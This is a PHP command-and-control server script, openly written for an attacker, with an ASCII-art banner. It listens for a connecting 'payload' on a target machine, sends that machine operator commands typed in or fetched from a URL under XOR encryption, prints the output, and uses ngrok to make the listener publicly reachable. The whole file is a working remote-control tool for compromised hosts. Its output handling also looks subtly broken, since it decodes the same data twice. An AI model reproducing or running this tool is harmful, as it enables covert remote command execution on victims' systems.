<?php
// This PHP C2 server script enables remote communication by utilizing XOR encryption for secure data transmission between the attacker server and the target, if you chose (command or URL) is encrypted using XOR encryption with a user-defined key before being sent to the target.

// decrypt data using XOR
function xor_encrypt($data, $key) {
    $output = '';
    for ($i = 0; $i < strlen($data); ++$i) {
        $output .= $data[$i] ^ $key[$i % strlen($key)];
    }
    return $output;
}

// send encrypted output to the payload
function send_to_payload($socket, $data, $encryption_key) {
    $encrypted_data = xor_encrypt($data, $encryption_key);
    socket_write($socket, $encrypted_data, strlen($encrypted_data));
}

// encrypted commands from the payload
function receive_from_payload($socket, $buffer_size, $encryption_key) {
    $encrypted_data = socket_read($socket, $buffer_size);
    return xor_encrypt($encrypted_data, $encryption_key);
}

// Function to start ngrok and return the forwarding address
function startNgrok($port) {
    $command = "ngrok tcp $port > /dev/null &";
    exec($command);
    sleep(5); // Give ngrok some time to start up

    $url = null;
    $tries = 5;
    while ($tries > 0 && !$url) {
        $ngrokApi = @file_get_contents('http://127.0.0.1:4040/api/tunnels');
        if ($ngrokApi) {
            $tunnels = json_decode($ngrokApi, true);
            if (isset($tunnels['tunnels'][0]['public_url'])) {
                $url = $tunnels['tunnels'][0]['public_url'];
            }
        }
        $tries--;
        sleep(1);
    }
    return $url;
}

echo "\033[0;32m";
echo <<<BANNER

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣤⣄⡀⠀⠀⠀⢀⣀⡀⣀⣠⣤⣤⠶⠶⠒⠒⠛⠛⠻⠷⠶⠦⢤⣀⠀⠀⠀⠀⠀⠀⠀⣠⠤⢖⣾⡇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣫⣁⠀⠉⠛⣷⣦⣶⠾⠋⠉⠡⠤⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⢷⣶⠶⠶⠚⠉⠀⠀⣽⣿⡇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⣤⣿⡿⠟⠛⠷⢶⣤⣄⣀⣀⠴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣀⠘⢷⣄⠀⣠⣶⣿⣿⣿⣧⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⠀⢤⣤⣶⣶⣶⠿⠋⠁⠀⠁⠛⠿⠟⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣁⣈⠻⣷⣿⣿⣿⣿⣿⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣇⠀⢿⣿⡿⠂⠀⠀⠀⠀⠀⠀⢀⣴⣿⠿⠿⠛⠻⣿⣿⣿⡿⣿⣿⣿⣇⠈⠉⠛⠋⣁⣀⠈⠻⢿⣿⣿⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣆⣠⡇⠀⠀⠀⠀⠀⠀⠀⠀⣼⡿⠛⠁⠀⠀⢠⠈⠙⢿⠇⡏⠘⣇⠙⠲⢶⣶⣿⣛⣛⣧⠄⠀⠙⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣶⣰⡟⠻⠃⡆⠀⠀⠀⠀⠀⠀⠀⢠⣿⡟⠐⣶⠚⠋⠉⣳⣦⣬⣴⣇⡀⠉⠳⢦⣴⠟⠛⠉⣿⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠛⠛⣡⣼⣾⡄⠀⠀⠀⠀⠀⠀⠀⢨⣿⣷⣆⣈⡛⠩⠉⠁⣨⡿⠟⢁⣀⠀⢠⠞⢿⣷⣶⡾⠛⢺⢤⢀⢀⠀⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡾⠀⣼⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⢺⣿⣿⣿⣿⣿⣿⣿⣾⠏⠀⠐⠋⠉⠂⠀⠀⠈⠻⡿⠁⠀⠀⠘⠛⠹⢼⡿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⡇⣤⣽⣿⣿⠟⢀⠄⠀⠀⠀⠀⠀⠀⠀⠚⠿⢿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣄⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣶⣠⣴⣿⠇⣼⣿⡿⢋⣴⠏⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠙⣩⣸⣿⠀⠀⠀⢀⣠⣤⣴⣶⣶⣦⣄⠹⣷⡀⠀⠀⠀⣽⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⣿⣿⠟⢁⣾⣿⣿⣷⡿⢁⣰⡟⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣶⣿⣿⣿⡋⠀⠀⢠⣿⠛⣿⡿⠻⣿⣿⣿⣷⠹⣷⠀⠀⢀⣿⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⠃⠀⣾⣿⣿⣿⣫⣴⣿⠏⢀⣴⡇⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣷⢂⠀⠀⢿⣿⡟⢳⣶⣿⣿⢻⣿⠀⢹⡶⣠⣸⣿⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣾⣿⣿⣿⣿⡟⠃⠀⢰⣿⣿⣿⣿⣿⡟⢁⣴⣿⠏⢀⣼⡆⠀⠀⠹⠇⠁⠻⠙⠟⠇⣿⣿⣿⢠⣄⠈⢿⣿⡄⣿⣿⣿⢸⠇⠀⢸⣿⣿⣿⣿⡆⠀⠀⠀⠀
⠀⢀⣴⣿⣿⣿⣿⣿⠟⠀⠀⠀⢠⣿⣿⣿⣿⣿⣶⣿⠟⠁⣠⣿⡿⠃⠀⢀⣠⣤⣤⣤⣄⣀⠀⢻⣿⣿⣿⣿⣦⣈⠛⢃⣿⡿⠿⠂⠀⣠⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀
⠀⣾⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⢫⣿⣿⣿⣿⣿⡟⢁⣠⣾⣿⠟⠁⠀⣰⡿⠛⣿⣿⣿⣿⣿⣯⡬⠛⠿⠿⠿⠿⠿⠿⠿⠛⠷⠶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀
⢸⣿⣿⣿⡿⠋⠀⠀⡀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣯⠖⠂⠀⠼⠋⢀⡾⣻⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣶⣶⣿⣿⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀
⢸⣿⣿⣿⠟⠀⣰⡞⢠⠂⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣷⡾⣋⣠⣤⡄⠈⠰⢻⡿⣿⢿⣿⠿⣻⡿⢛⣽⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀
⢸⣿⣿⡟⢀⣾⣿⣱⣿⡞⡀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣾⣿⣿⣿⠇⠀⡀⠀⠀⠁⠚⠁⠘⠋⢠⡾⠃⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⡀
⠼⣻⣿⢡⣿⣿⣿⣿⣿⣷⡇⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⣾⣿⣀⡿⠀⣠⠄⠀⠀⠀⠀⠀⣤⡙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠣
⠀⢟⣿⣿⣿⣿⣿⣿⣿⣿⣿⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⣠⡄⣿⣿⣿⡇⢠⣿⡀⣾⢣⣾⣰⣆⢿⣿⣜⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠘⠃⠀
⠀⠺⠟⠋⣿⠟⠛⣽⣿⣿⣿⣿⣿⣿⢿⡿⠋⠘⣿⣿⣿⣿⣿⣇⣾⣿⣷⣿⣿⣿⣷⣄⢿⣿⣿⣸⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⡿⠉⠃⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⠟⠛⣿⠟⠋⠀⠀⠀⠀⠀⠀⠈⣿⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈⠃⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⠇⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠹⢿⣿⡝⠿⣇⠙⠛⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⠻⣿⣿⠿⣿⣿⡿⢻⣿⣿⠋⠀⠀⠀⠀⠀⠁⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠟⠁⠀⠘⠋⠀⠈⢿⠇⠀⠙⠃⠀⠀⠀⠀⠀⠀⠀

BANNER;
echo "\033[0m\n"; 

$attacker_ip = readline("[*] Enter your IP: ");
$c2_port = readline("[*] Enter C2 server port: ");
$encryption_key = readline("[*] Enter XOR encryption key: ");

$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
if ($socket === false) {
    echo "Socket creation failed: " . socket_strerror(socket_last_error()) . "\n";
    exit(1);
}

if (!socket_bind($socket, $attacker_ip, $c2_port)) {
    echo "Socket bind failed: " . socket_strerror(socket_last_error()) . "\n";
    exit(1);
}

if (!socket_listen($socket, 5)) {
    echo "Socket listen failed: " . socket_strerror(socket_last_error()) . "\n";
    exit(1);
}

echo "[*] Waiting for incoming connection...\n";

// Fork a child process to handle ngrok setup
$pid = pcntl_fork();
if ($pid == -1) {
    die('Could not fork process');
} elseif ($pid) {
    // Parent process: Accept incoming connection
    $client_socket = socket_accept($socket);
    if ($client_socket === false) {
        echo "Socket accept failed: " . socket_strerror(socket_last_error()) . "\n";
        exit(1);
    }

    // Main loop for fetching and executing commands
    while (true) {
        // Prompt the user to choose the method of command input
        $input_method = strtolower(readline("[*] Choose command input method (url/command): "));
        if ($input_method === 'url') {
            // Fetch commands from URL
            $command_url = readline("[*] Enter command URL: ");
            $command_encrypted = file_get_contents($command_url);
            if ($command_encrypted === false) {
                echo "Error fetching commands from $command_url.\n";
                continue;
            }
            send_to_payload($client_socket, $command_encrypted, $encryption_key);
        } elseif ($input_method === 'command') {
            // Get command directly from user
            $command = readline("[*] BEAR >> ");
            send_to_payload($client_socket, $command, $encryption_key);
        } else {
            echo "Invalid input method. Please choose 'url' or 'command'.\n";
            continue;
        }

        // Receive output from payload
        $output_encrypted = receive_from_payload($client_socket, 4096, $encryption_key);

        // Decrypt output
        $output = xor_encrypt($output_encrypted, $encryption_key);

        echo "[*] Command Output:\n$output\n";

        // Wait for a period before fetching new commands
        sleep(10);
    }

    // Close sockets
    socket_close($client_socket);
    socket_close($socket);
} else {
    // Child process: start ngrok and print the forwarding address
    echo "Starting ngrok on port $c2_port\n";
    $publicUrl = startNgrok($c2_port);
    if ($publicUrl) {
        echo "ngrok is forwarding TCP connections from $publicUrl to $attacker_ip:$c2_port\n";
    } else {
        echo "Failed to retrieve ngrok public URL.\n";
    }
}
?>

